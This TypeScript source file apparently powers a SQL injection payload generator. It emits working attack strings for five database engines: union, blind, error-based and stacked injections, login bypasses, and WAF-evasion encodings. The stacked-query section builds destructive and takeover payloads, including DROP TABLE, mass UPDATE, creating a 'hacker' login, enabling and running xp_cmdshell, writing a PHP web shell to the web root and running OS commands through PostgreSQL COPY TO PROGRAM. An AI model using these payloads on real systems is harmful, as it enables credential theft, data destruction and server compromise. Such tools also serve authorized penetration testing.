// ── Types ──────────────────────────────────────────────────────────

export type DbType = "mysql" | "mssql" | "postgresql" | "oracle" | "sqlite";

export type InjectionType =
  | "union"
  | "boolean-blind"
  | "time-blind"
  | "error-based"
  | "stacked";

export type InjectionContext = "numeric" | "string-single" | "string-double";

export type CommentStyle = "--" | "#" | "/* */" | "-- -";

export type WafBypass = "none" | "case-swap" | "inline-comment" | "url-encode" | "double-encode" | "whitespace";

export interface SqliPayload {
  name: string;
  payload: string;
  description: string;
  tags: string[];
  db: DbType;
  type: InjectionType;
}

export interface SqliConfig {
  db: DbType;
  injectionType: InjectionType;
  context: InjectionContext;
  comment: CommentStyle;
  columns: number;
  wafBypass: WafBypass;
  table: string;
  column: string;
}

// ── Constants ─────────────────────────────────────────────────────

export const DB_TYPES: { id: DbType; name: string; description: string }[] = [
  { id: "mysql", name: "MySQL", description: "MySQL / MariaDB" },
  { id: "mssql", name: "MSSQL", description: "Microsoft SQL Server" },
  { id: "postgresql", name: "PostgreSQL", description: "PostgreSQL / Postgres" },
  { id: "oracle", name: "Oracle", description: "Oracle Database" },
  { id: "sqlite", name: "SQLite", description: "SQLite (file-based)" },
];

export const INJECTION_TYPES: { id: InjectionType; name: string; description: string }[] = [
  { id: "union", name: "UNION-based", description: "Extract data via UNION SELECT" },
  { id: "boolean-blind", name: "Boolean Blind", description: "Infer data from true/false responses" },
  { id: "time-blind", name: "Time-based Blind", description: "Infer data from response time delays" },
  { id: "error-based", name: "Error-based", description: "Extract data from DB error messages" },
  { id: "stacked", name: "Stacked Queries", description: "Execute multiple statements with ;" },
];

export const CONTEXTS: { id: InjectionContext; name: string; example: string; description: string }[] = [
  { id: "numeric", name: "Numeric", example: "WHERE id = INJECT", description: "Value injected without quotes (integer parameter)" },
  { id: "string-single", name: "String (single-quoted)", example: "WHERE name = 'INJECT'", description: "Value wrapped in single quotes" },
  { id: "string-double", name: "String (double-quoted)", example: 'WHERE name = "INJECT"', description: "Value wrapped in double quotes" },
];

export const COMMENT_STYLES: { id: CommentStyle; name: string; dbs: DbType[] }[] = [
  { id: "--", name: "-- (double dash)", dbs: ["mysql", "mssql", "postgresql", "oracle", "sqlite"] },
  { id: "-- -", name: "-- - (dash space dash)", dbs: ["mysql"] },
  { id: "#", name: "# (hash)", dbs: ["mysql"] },
  { id: "/* */", name: "/* */ (block comment)", dbs: ["mysql", "mssql", "postgresql", "oracle", "sqlite"] },
];

export const WAF_BYPASSES: { id: WafBypass; name: string; description: string }[] = [
  { id: "none", name: "No Bypass", description: "Standard payloads" },
  { id: "case-swap", name: "Case Swap", description: "Alternate upper/lower case keywords" },
  { id: "inline-comment", name: "Inline Comments", description: "Insert /**/ between keywords" },
  { id: "url-encode", name: "URL Encode", description: "URL-encode key characters" },
  { id: "double-encode", name: "Double URL Encode", description: "Double URL-encode key characters" },
  { id: "whitespace", name: "Whitespace Variants", description: "Use tabs/newlines instead of spaces" },
];

// ── Helper functions ──────────────────────────────────────────────

function commentStr(comment: CommentStyle): string {
  if (comment === "/* */") return "/**/";
  return comment;
}

function breakOut(context: InjectionContext): string {
  switch (context) {
    case "numeric": return "";
    case "string-single": return "' ";
    case "string-double": return '" ';
  }
}

function unionNulls(columns: number, targetCol: number, expr: string): string {
  const parts = [];
  for (let i = 1; i <= columns; i++) {
    parts.push(i === targetCol ? expr : "NULL");
  }
  return parts.join(",");
}

function sleepFn(db: DbType, seconds: number): string {
  switch (db) {
    case "mysql": return `SLEEP(${seconds})`;
    case "mssql": return `WAITFOR DELAY '0:0:${seconds}'`;
    case "postgresql": return `pg_sleep(${seconds})`;
    case "oracle": return `DBMS_LOCK.SLEEP(${seconds})`;
    case "sqlite": return `randomblob(${seconds}00000000)`;
  }
}

function versionFn(db: DbType): string {
  switch (db) {
    case "mysql": return "@@version";
    case "mssql": return "@@version";
    case "postgresql": return "version()";
    case "oracle": return "banner FROM v$version";
    case "sqlite": return "sqlite_version()";
  }
}

function currentUserFn(db: DbType): string {
  switch (db) {
    case "mysql": return "user()";
    case "mssql": return "SYSTEM_USER";
    case "postgresql": return "current_user";
    case "oracle": return "USER FROM dual";
    case "sqlite": return "'SQLite'";
  }
}

function currentDbFn(db: DbType): string {
  switch (db) {
    case "mysql": return "database()";
    case "mssql": return "DB_NAME()";
    case "postgresql": return "current_database()";
    case "oracle": return "SYS_CONTEXT('USERENV','DB_NAME') FROM dual";
    case "sqlite": return "'main'";
  }
}

function tableEnumQuery(db: DbType): string {
  switch (db) {
    case "mysql": return "table_name FROM information_schema.tables WHERE table_schema=database()";
    case "mssql": return "table_name FROM information_schema.tables";
    case "postgresql": return "table_name FROM information_schema.tables WHERE table_schema='public'";
    case "oracle": return "table_name FROM all_tables";
    case "sqlite": return "name FROM sqlite_master WHERE type='table'";
  }
}

function columnEnumQuery(db: DbType, table: string): string {
  const t = table || "users";
  switch (db) {
    case "mysql": return `column_name FROM information_schema.columns WHERE table_name='${t}'`;
    case "mssql": return `column_name FROM information_schema.columns WHERE table_name='${t}'`;
    case "postgresql": return `column_name FROM information_schema.columns WHERE table_name='${t}'`;
    case "oracle": return `column_name FROM all_tab_columns WHERE table_name='${t.toUpperCase()}'`;
    case "sqlite": return `sql FROM sqlite_master WHERE type='table' AND name='${t}'`;
  }
}

function concatFn(db: DbType, a: string, b: string): string {
  switch (db) {
    case "mysql": return `CONCAT(${a},0x3a,${b})`;
    case "mssql": return `${a}+CHAR(58)+${b}`;
    case "postgresql": return `${a}||CHR(58)||${b}`;
    case "oracle": return `${a}||CHR(58)||${b}`;
    case "sqlite": return `${a}||':'||${b}`;
  }
}

function errorExtractFn(db: DbType, expr: string): string {
  switch (db) {
    case "mysql": return `extractvalue(1,concat(0x7e,(${expr})))`;
    case "mssql": return `CONVERT(int,(${expr}))`;
    case "postgresql": return `CAST((${expr}) AS int)`;
    case "oracle": return `CTXSYS.DRITHSX.SN(1,(${expr}))`;
    case "sqlite": return `CAST((${expr}) AS int)`;
  }
}

function substringFn(db: DbType, expr: string, pos: number, len: number): string {
  switch (db) {
    case "mysql": return `SUBSTRING(${expr},${pos},${len})`;
    case "mssql": return `SUBSTRING(${expr},${pos},${len})`;
    case "postgresql": return `SUBSTRING(${expr},${pos},${len})`;
    case "oracle": return `SUBSTR(${expr},${pos},${len})`;
    case "sqlite": return `SUBSTR(${expr},${pos},${len})`;
  }
}

function ifFn(db: DbType, condition: string, trueVal: string, falseVal: string): string {
  switch (db) {
    case "mysql": return `IF(${condition},${trueVal},${falseVal})`;
    case "mssql": return `CASE WHEN ${condition} THEN ${trueVal} ELSE ${falseVal} END`;
    case "postgresql": return `CASE WHEN ${condition} THEN ${trueVal} ELSE ${falseVal} END`;
    case "oracle": return `CASE WHEN ${condition} THEN ${trueVal} ELSE ${falseVal} END`;
    case "sqlite": return `CASE WHEN ${condition} THEN ${trueVal} ELSE ${falseVal} END`;
  }
}

// ── WAF bypass transforms ─────────────────────────────────────────

function applyCaseSwap(s: string): string {
  const keywords = ["SELECT", "UNION", "FROM", "WHERE", "ORDER", "GROUP", "INSERT", "UPDATE", "DELETE", "AND", "OR", "NULL", "CONCAT", "CAST", "SLEEP", "WAITFOR", "DELAY", "BENCHMARK", "SUBSTR", "SUBSTRING", "CHAR", "INFORMATION_SCHEMA", "TABLE", "COLUMN"];
  let result = s;
  for (const kw of keywords) {
    const regex = new RegExp(`\\b${kw}\\b`, "gi");
    result = result.replace(regex, (match) => {
      return [...match].map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join("");
    });
  }
  return result;
}

function applyInlineComment(s: string): string {
  return s.replace(/ /g, "/**/");
}

function applyUrlEncode(s: string): string {
  const special: Record<string, string> = { " ": "%20", "'": "%27", '"': "%22", "=": "%3D", "(": "%28", ")": "%29", ";": "%3B", "#": "%23" };
  return [...s].map((c) => special[c] ?? c).join("");
}

function applyDoubleUrlEncode(s: string): string {
  const special: Record<string, string> = { " ": "%2520", "'": "%2527", '"': "%2522", "=": "%253D", "(": "%2528", ")": "%2529", ";": "%253B", "#": "%2523" };
  return [...s].map((c) => special[c] ?? c).join("");
}

function applyWhitespace(s: string): string {
  return s.replace(/ /g, "\t");
}

function applyWafBypass(payload: string, bypass: WafBypass): string {
  switch (bypass) {
    case "none": return payload;
    case "case-swap": return applyCaseSwap(payload);
    case "inline-comment": return applyInlineComment(payload);
    case "url-encode": return applyUrlEncode(payload);
    case "double-encode": return applyDoubleUrlEncode(payload);
    case "whitespace": return applyWhitespace(payload);
  }
}

// ── Payload generators ────────────────────────────────────────────

function generateUnionPayloads(config: SqliConfig): SqliPayload[] {
  const { db, context, comment, columns, table, column } = config;
  const c = commentStr(comment);
  const bo = breakOut(context);
  const n = columns < 1 ? 3 : columns;
  const payloads: SqliPayload[] = [];

  // Column count detection (ORDER BY)
  payloads.push({
    name: "Column count (ORDER BY)",
    payload: `${bo}ORDER BY ${n}${c}`,
    description: `Test column count with ORDER BY. Increment until you get an error to find the exact column count.`,
    tags: ["recon", "column-count"],
    db, type: "union",
  });

  // Column count detection (UNION NULL)
  payloads.push({
    name: "Column count (UNION NULL)",
    payload: `${bo}UNION SELECT ${unionNulls(n, 0, "")}${c}`.replace(",", ",").replace(",,", ",NULL,"),
    description: `Test column count with UNION SELECT NULLs. Add NULLs until the query succeeds.`,
    tags: ["recon", "column-count"],
    db, type: "union",
  });

  // Fix the UNION NULL payload
  const nullList = Array(n).fill("NULL").join(",");
  payloads[1].payload = `${bo}UNION SELECT ${nullList}${c}`;

  // Extract DB version
  payloads.push({
    name: "Extract DB version",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, versionFn(db))}${c}`,
    description: `Extract the database version string via UNION injection.`,
    tags: ["recon", "version"],
    db, type: "union",
  });

  // Extract current user
  payloads.push({
    name: "Extract current user",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, currentUserFn(db))}${c}`,
    description: `Extract the current database user.`,
    tags: ["recon", "user"],
    db, type: "union",
  });

  // Extract current database
  payloads.push({
    name: "Extract current database",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, currentDbFn(db))}${c}`,
    description: `Extract the current database name.`,
    tags: ["recon", "database"],
    db, type: "union",
  });

  // Enumerate tables
  payloads.push({
    name: "Enumerate tables",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, tableEnumQuery(db))}${c}`,
    description: `List all table names accessible to the current user.`,
    tags: ["enum", "tables"],
    db, type: "union",
  });

  // Enumerate columns
  payloads.push({
    name: "Enumerate columns",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, columnEnumQuery(db, table))}${c}`,
    description: `List column names for the target table.`,
    tags: ["enum", "columns"],
    db, type: "union",
  });

  // Extract data
  const t = table || "users";
  const col = column || "password";
  payloads.push({
    name: "Extract data",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, `${col} FROM ${t}`)}${c}`,
    description: `Extract data from the target table and column.`,
    tags: ["extract", "data"],
    db, type: "union",
  });

  // Extract with concat (username:password pattern)
  payloads.push({
    name: "Extract concatenated data",
    payload: `${bo}UNION SELECT ${unionNulls(n, 1, concatFn(db, "username", col) + ` FROM ${t}`)}${c}`,
    description: `Extract username:password pairs concatenated with a colon separator.`,
    tags: ["extract", "data", "concat"],
    db, type: "union",
  });

  return payloads;
}

function generateBooleanBlindPayloads(config: SqliConfig): SqliPayload[] {
  const { db, context, comment, table, column } = config;
  const c = commentStr(comment);
  const bo = breakOut(context);
  const payloads: SqliPayload[] = [];
  const t = table || "users";
  const col = column || "password";

  // Basic true/false test
  payloads.push({
    name: "Boolean true test",
    payload: `${bo}AND 1=1${c}`,
    description: `Baseline true condition. Compare response with false condition to confirm injection.`,
    tags: ["detect", "boolean"],
    db, type: "boolean-blind",
  });

  payloads.push({
    name: "Boolean false test",
    payload: `${bo}AND 1=2${c}`,
    description: `Baseline false condition. Different response from true test confirms injection point.`,
    tags: ["detect", "boolean"],
    db, type: "boolean-blind",
  });

  // OR-based
  payloads.push({
    name: "OR true test",
    payload: `${bo}OR 1=1${c}`,
    description: `OR-based true condition. Returns all rows if injectable.`,
    tags: ["detect", "boolean"],
    db, type: "boolean-blind",
  });

  // Substring extraction
  payloads.push({
    name: "Extract char (position 1)",
    payload: `${bo}AND ${substringFn(db, `(SELECT ${col} FROM ${t} LIMIT 1)`, 1, 1)}='a'${c}`,
    description: `Test if the first character of the target value equals 'a'. Iterate through characters to extract data.`,
    tags: ["extract", "substring"],
    db, type: "boolean-blind",
  });

  // ASCII comparison
  payloads.push({
    name: "Extract char (ASCII comparison)",
    payload: `${bo}AND ASCII(${substringFn(db, `(SELECT ${col} FROM ${t} LIMIT 1)`, 1, 1)})>96${c}`,
    description: `Binary search via ASCII value comparison. Use greater-than/less-than to narrow down each character.`,
    tags: ["extract", "ascii", "binary-search"],
    db, type: "boolean-blind",
  });

  // Table existence check
  payloads.push({
    name: "Check table exists",
    payload: `${bo}AND (SELECT COUNT(*) FROM ${t})>=0${c}`,
    description: `Check if the target table exists. True response confirms the table name.`,
    tags: ["enum", "tables"],
    db, type: "boolean-blind",
  });

  // String length extraction
  payloads.push({
    name: "Extract data length",
    payload: `${bo}AND LENGTH((SELECT ${col} FROM ${t} LIMIT 1))>0${c}`,
    description: `Determine the length of the target value using binary search on LENGTH().`,
    tags: ["extract", "length"],
    db, type: "boolean-blind",
  });

  // Conditional true/false with IF/CASE
  payloads.push({
    name: "Conditional boolean (IF/CASE)",
    payload: `${bo}AND ${ifFn(db, `${substringFn(db, `(SELECT ${col} FROM ${t} LIMIT 1)`, 1, 1)}='a'`, "1", "0")}=1${c}`,
    description: `Conditional extraction using database-specific IF/CASE syntax.`,
    tags: ["extract", "conditional"],
    db, type: "boolean-blind",
  });

  return payloads;
}

function generateTimeBlindPayloads(config: SqliConfig): SqliPayload[] {
  const { db, context, comment, table, column } = config;
  const c = commentStr(comment);
  const bo = breakOut(context);
  const payloads: SqliPayload[] = [];
  const t = table || "users";
  const col = column || "password";

  // Basic time delay
  payloads.push({
    name: "Basic time delay",
    payload: db === "mssql"
      ? `${bo}; ${sleepFn(db, 5)}${c}`
      : `${bo}AND ${sleepFn(db, 5)}${c}`,
    description: `Inject a ${db === "sqlite" ? "CPU-intensive operation" : "5-second delay"}. If the response is delayed, the injection point is confirmed.`,
    tags: ["detect", "time-delay"],
    db, type: "time-blind",
  });

  // Conditional time delay
  payloads.push({
    name: "Conditional time delay (true)",
    payload: db === "mssql"
      ? `${bo}; IF(1=1) ${sleepFn(db, 5)}${c}`
      : `${bo}AND ${ifFn(db, "1=1", sleepFn(db, 5), "0")}${c}`,
    description: `Conditional delay on true condition. Compare with false to confirm control over delay timing.`,
    tags: ["detect", "conditional", "time-delay"],
    db, type: "time-blind",
  });

  payloads.push({
    name: "Conditional time delay (false)",
    payload: db === "mssql"
      ? `${bo}; IF(1=2) ${sleepFn(db, 5)}${c}`
      : `${bo}AND ${ifFn(db, "1=2", sleepFn(db, 5), "0")}${c}`,
    description: `Conditional delay on false condition. Should NOT delay — confirms conditional control.`,
    tags: ["detect", "conditional", "time-delay"],
    db, type: "time-blind",
  });

  // Character extraction with time
  payloads.push({
    name: "Extract char via time delay",
    payload: db === "mssql"
      ? `${bo}; IF(${substringFn(db, `(SELECT TOP 1 ${col} FROM ${t})`, 1, 1)}='a') ${sleepFn(db, 5)}${c}`
      : `${bo}AND ${ifFn(db, `${substringFn(db, `(SELECT ${col} FROM ${t} LIMIT 1)`, 1, 1)}='a'`, sleepFn(db, 5), "0")}${c}`,
    description: `Extract characters one at a time using conditional time delays. Delay means the character matches.`,
    tags: ["extract", "time-delay", "substring"],
    db, type: "time-blind",
  });

  // MySQL BENCHMARK alternative
  if (db === "mysql") {
    payloads.push({
      name: "BENCHMARK delay (MySQL)",
      payload: `${bo}AND BENCHMARK(10000000,SHA1('test'))${c}`,
      description: `Alternative time delay using BENCHMARK. Useful when SLEEP() is blocked.`,
      tags: ["detect", "time-delay", "benchmark"],
      db, type: "time-blind",
    });
  }

  // Heavy query for SQLite
  if (db === "sqlite") {
    payloads.push({
      name: "Heavy query delay (SQLite)",
      payload: `${bo}AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))${c}`,
      description: `SQLite has no SLEEP(). This uses a computationally expensive operation to cause delay.`,
      tags: ["detect", "time-delay", "heavy-query"],
      db, type: "time-blind",
    });
  }

  return payloads;
}

function generateErrorBasedPayloads(config: SqliConfig): SqliPayload[] {
  const { db, context, comment } = config;
  const c = commentStr(comment);
  const bo = breakOut(context);
  const payloads: SqliPayload[] = [];

  // Extract version via error
  payloads.push({
    name: "Extract version via error",
    payload: `${bo}AND ${errorExtractFn(db, versionFn(db))}${c}`,
    description: `Force a type conversion error that leaks the DB version in the error message.`,
    tags: ["recon", "version", "error"],
    db, type: "error-based",
  });

  // Extract current user via error
  payloads.push({
    name: "Extract user via error",
    payload: `${bo}AND ${errorExtractFn(db, currentUserFn(db))}${c}`,
    description: `Force an error that leaks the current database user.`,
    tags: ["recon", "user", "error"],
    db, type: "error-based",
  });

  // Extract current database via error
  payloads.push({
    name: "Extract database via error",
    payload: `${bo}AND ${errorExtractFn(db, currentDbFn(db))}${c}`,
    description: `Force an error that leaks the current database name.`,
    tags: ["recon", "database", "error"],
    db, type: "error-based",
  });

  // MySQL-specific: extractvalue and updatexml
  if (db === "mysql") {
    payloads.push({
      name: "EXTRACTVALUE (MySQL)",
      payload: `${bo}AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))${c}`,
      description: `MySQL-specific error extraction using extractvalue() with XPath.`,
      tags: ["recon", "version", "extractvalue"],
      db, type: "error-based",
    });

    payloads.push({
      name: "UPDATEXML (MySQL)",
      payload: `${bo}AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)${c}`,
      description: `MySQL-specific error extraction using updatexml() with XPath.`,
      tags: ["recon", "version", "updatexml"],
      db, type: "error-based",
    });

    payloads.push({
      name: "Double query error (MySQL)",
      payload: `${bo}AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)${c}`,
      description: `MySQL double-query error technique using GROUP BY with RAND().`,
      tags: ["recon", "version", "double-query"],
      db, type: "error-based",
    });
  }

  // MSSQL-specific
  if (db === "mssql") {
    payloads.push({
      name: "CONVERT error (MSSQL)",
      payload: `${bo}AND 1=CONVERT(int,(SELECT @@version))${c}`,
      description: `MSSQL-specific: force a conversion error that leaks data.`,
      tags: ["recon", "version", "convert"],
      db, type: "error-based",
    });

    payloads.push({
      name: "CAST error (MSSQL)",
      payload: `${bo}AND 1=CAST((SELECT @@version) AS int)${c}`,
      description: `MSSQL-specific: force a CAST error that leaks data.`,
      tags: ["recon", "version", "cast"],
      db, type: "error-based",
    });
  }

  // PostgreSQL-specific
  if (db === "postgresql") {
    payloads.push({
      name: "CAST error (PostgreSQL)",
      payload: `${bo}AND 1=CAST((SELECT version()) AS int)${c}`,
      description: `PostgreSQL-specific: force a CAST error that leaks the version.`,
      tags: ["recon", "version", "cast"],
      db, type: "error-based",
    });
  }

  // Oracle-specific
  if (db === "oracle") {
    payloads.push({
      name: "UTL_INADDR (Oracle)",
      payload: `${bo}AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))${c}`,
      description: `Oracle-specific: force a DNS lookup error that leaks data.`,
      tags: ["recon", "version", "utl_inaddr"],
      db, type: "error-based",
    });

    payloads.push({
      name: "CTXSYS.DRITHSX.SN (Oracle)",
      payload: `${bo}AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))${c}`,
      description: `Oracle-specific: extract data via CTXSYS error.`,
      tags: ["recon", "version", "ctxsys"],
      db, type: "error-based",
    });
  }

  return payloads;
}

function generateStackedPayloads(config: SqliConfig): SqliPayload[] {
  const { db, context, comment, table, column } = config;
  const c = commentStr(comment);
  const bo = breakOut(context);
  const payloads: SqliPayload[] = [];
  const t = table || "users";
  const col = column || "password";

  // Basic stacked query
  payloads.push({
    name: "Stacked: time delay",
    payload: db === "mssql"
      ? `${bo}; ${sleepFn(db, 5)}${c}`
      : `${bo}; SELECT ${sleepFn(db, 5)}${c}`,
    description: `Test stacked query support with a time delay. Not all DB drivers support stacked queries.`,
    tags: ["detect", "stacked"],
    db, type: "stacked",
  });

  // Create user (MSSQL)
  if (db === "mssql") {
    payloads.push({
      name: "Stacked: create login (MSSQL)",
      payload: `${bo}; CREATE LOGIN hacker WITH PASSWORD='P@ssw0rd!'${c}`,
      description: `Create a new SQL Server login. Requires sysadmin or securityadmin privileges.`,
      tags: ["exploit", "create-user"],
      db, type: "stacked",
    });

    payloads.push({
      name: "Stacked: enable xp_cmdshell (MSSQL)",
      payload: `${bo}; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE${c}`,
      description: `Enable xp_cmdshell for OS command execution. Requires sysadmin privileges.`,
      tags: ["exploit", "rce", "xp_cmdshell"],
      db, type: "stacked",
    });

    payloads.push({
      name: "Stacked: xp_cmdshell exec (MSSQL)",
      payload: `${bo}; EXEC xp_cmdshell 'whoami'${c}`,
      description: `Execute OS commands via xp_cmdshell. Must be enabled first.`,
      tags: ["exploit", "rce", "xp_cmdshell"],
      db, type: "stacked",
    });
  }

  // INSERT data
  payloads.push({
    name: "Stacked: INSERT data",
    payload: `${bo}; INSERT INTO ${t}(${col}) VALUES('injected')${c}`,
    description: `Insert data into the target table via stacked query.`,
    tags: ["exploit", "insert"],
    db, type: "stacked",
  });

  // UPDATE data
  payloads.push({
    name: "Stacked: UPDATE data",
    payload: `${bo}; UPDATE ${t} SET ${col}='hacked' WHERE 1=1${c}`,
    description: `Update all rows in the target table. Use with caution.`,
    tags: ["exploit", "update"],
    db, type: "stacked",
  });

  // DROP table (dangerous)
  payloads.push({
    name: "Stacked: DROP table",
    payload: `${bo}; DROP TABLE ${t}${c}`,
    description: `Drop the target table. Destructive operation — use only in authorized testing.`,
    tags: ["exploit", "drop", "destructive"],
    db, type: "stacked",
  });

  // MySQL-specific: INTO OUTFILE
  if (db === "mysql") {
    payloads.push({
      name: "Stacked: write file (MySQL)",
      payload: `${bo}; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'${c}`,
      description: `Write a web shell to disk via INTO OUTFILE. Requires FILE privilege and known web root.`,
      tags: ["exploit", "file-write", "webshell"],
      db, type: "stacked",
    });
  }

  // PostgreSQL-specific: COPY
  if (db === "postgresql") {
    payloads.push({
      name: "Stacked: read file (PostgreSQL)",
      payload: `${bo}; CREATE TABLE file_leak(content TEXT); COPY file_leak FROM '/etc/passwd'${c}`,
      description: `Read server files via COPY. Requires superuser privileges.`,
      tags: ["exploit", "file-read"],
      db, type: "stacked",
    });

    payloads.push({
      name: "Stacked: OS command (PostgreSQL)",
      payload: `${bo}; COPY (SELECT '') TO PROGRAM 'whoami'${c}`,
      description: `Execute OS commands via COPY TO PROGRAM. Requires superuser privileges.`,
      tags: ["exploit", "rce"],
      db, type: "stacked",
    });
  }

  return payloads;
}

// ── Authentication bypass payloads ────────────────────────────────

function generateAuthBypassPayloads(config: SqliConfig): SqliPayload[] {
  const { db } = config;
  const payloads: SqliPayload[] = [];

  const bypasses = [
    { name: "Classic OR bypass", payload: "' OR 1=1--", description: "Classic authentication bypass — returns true for all rows." },
    { name: "OR bypass (no quotes)", payload: "' OR '1'='1", description: "Bypass without needing to comment out the rest of the query." },
    { name: "OR bypass (double quotes)", payload: '" OR 1=1--', description: "Double-quote variant for double-quoted contexts." },
    { name: "Admin bypass", payload: "admin'--", description: "Log in as 'admin' by commenting out the password check." },
    { name: "Admin OR bypass", payload: "admin' OR '1'='1", description: "Log in as 'admin' with OR true condition." },
    { name: "Comment password", payload: "' OR 1=1#", description: "MySQL-specific: use # comment to bypass password check." },
    { name: "UNION admin bypass", payload: "' UNION SELECT 1,'admin','password'--", description: "Inject a fake admin row via UNION. Adjust column count as needed." },
    { name: "Nested OR bypass", payload: "') OR ('1'='1", description: "Bypass for queries with parentheses around the condition." },
  ];

  for (const b of bypasses) {
    payloads.push({
      ...b,
      tags: ["auth-bypass"],
      db,
      type: "union", // categorize loosely
    });
  }

  return payloads;
}

// ── Quick reference ───────────────────────────────────────────────

export const QUICK_REFERENCE = [
  { payload: "' OR 1=1--", description: "Classic auth bypass", context: "Login form", db: "All" },
  { payload: "' UNION SELECT NULL,NULL,NULL--", description: "Column count enumeration", context: "UNION", db: "All" },
  { payload: "' AND 1=1--", description: "Boolean true test", context: "Boolean blind", db: "All" },
  { payload: "' AND SLEEP(5)--", description: "Time-based detection", context: "Time blind", db: "MySQL" },
  { payload: "'; WAITFOR DELAY '0:0:5'--", description: "Time-based detection", context: "Time blind", db: "MSSQL" },
  { payload: "' AND extractvalue(1,concat(0x7e,version()))--", description: "Error-based version leak", context: "Error-based", db: "MySQL" },
  { payload: "' AND 1=CONVERT(int,@@version)--", description: "Error-based version leak", context: "Error-based", db: "MSSQL" },
  { payload: "' UNION SELECT table_name FROM information_schema.tables--", description: "Table enumeration", context: "UNION", db: "MySQL/MSSQL/PG" },
];

// ── Main generator ────────────────────────────────────────────────

export function getDefaultConfig(): SqliConfig {
  return {
    db: "mysql",
    injectionType: "union",
    context: "string-single",
    comment: "--",
    columns: 3,
    wafBypass: "none",
    table: "users",
    column: "password",
  };
}

export function generatePayloads(config: SqliConfig): SqliPayload[] {
  let payloads: SqliPayload[] = [];

  switch (config.injectionType) {
    case "union":
      payloads = generateUnionPayloads(config);
      break;
    case "boolean-blind":
      payloads = generateBooleanBlindPayloads(config);
      break;
    case "time-blind":
      payloads = generateTimeBlindPayloads(config);
      break;
    case "error-based":
      payloads = generateErrorBasedPayloads(config);
      break;
    case "stacked":
      payloads = generateStackedPayloads(config);
      break;
  }

  // Apply WAF bypass
  if (config.wafBypass !== "none") {
    payloads = payloads.map((p) => ({
      ...p,
      payload: applyWafBypass(p.payload, config.wafBypass),
    }));
  }

  return payloads;
}

export function getAuthBypassPayloads(config: SqliConfig): SqliPayload[] {
  return generateAuthBypassPayloads(config);
}
